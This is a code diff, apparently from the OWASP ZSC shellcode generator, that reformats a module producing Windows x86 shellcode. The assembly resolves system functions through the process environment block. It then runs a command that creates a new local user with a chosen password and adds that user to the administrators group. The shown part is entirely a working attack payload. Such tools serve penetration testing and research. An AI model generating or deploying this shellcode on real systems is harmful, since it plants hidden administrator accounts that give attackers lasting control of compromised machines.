@@ -8,8 +8,10 @@ https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com 
 '''
 from core import stack
 from math import ceil
-def add_admin(command_hex,command):
-        return '''
+
+
+def add_admin(command_hex, command):
+    return '''
 xor    %ecx,%ecx
 mov    %fs:0x30(%ecx),%eax
 mov    0xc(%eax),%eax
@@ -81,10 +83,11 @@ call   *%edx
 xor    %ecx,%ecx
 push   %ecx
 call   *%eax
-'''.format(command_hex,hex(int(8 + 4*(ceil(len(command)/float(4))))))
+'''.format(command_hex, hex(int(8 + 4 * (ceil(len(command) / float(4))))))
+
 
 def run(data):
-   username = data[0]
-   passsword = data[1]
-   command = "cmd.exe /c net user " + username + " " + passsword + " /add && net localgroup administrators " + username + " /add"
-   return add_admin(stack.generate(command,"%ecx","string"),command)
+    username = data[0]
+    passsword = data[1]
+    command = "cmd.exe /c net user " + username + " " + passsword + " /add && net localgroup administrators " + username + " /add"
+    return add_admin(stack.generate(command, "%ecx", "string"), command)
